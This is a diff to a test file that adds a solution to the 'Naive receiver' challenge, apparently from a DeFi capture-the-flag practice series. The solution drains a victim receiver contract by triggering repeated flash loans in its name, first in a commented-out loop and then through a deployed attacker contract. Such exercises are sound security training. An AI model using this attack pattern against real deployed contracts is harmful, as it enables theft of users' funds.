@@ -38,6 +38,22 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // version 1.0.0
+        // for (let i = 0; i < 10; i++) {
+        //     await pool.flashLoan(
+        //         receiver.address, 
+        //         "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", 
+        //         1,
+        //         "0x"
+        //     )
+        // }
+        
+        // version 2.0.0
+        const Attacker = await ethers.getContractFactory('Attacker', player);
+        attacker = await Attacker.deploy();
+        await attacker.attack(pool.address, receiver.address, 10);
+        console.log("receiver", (await ethers.provider.getBalance(receiver.address)).toString())
+        console.log("pool", (await ethers.provider.getBalance(pool.address)).toString())
     });
 
     after(async function () {
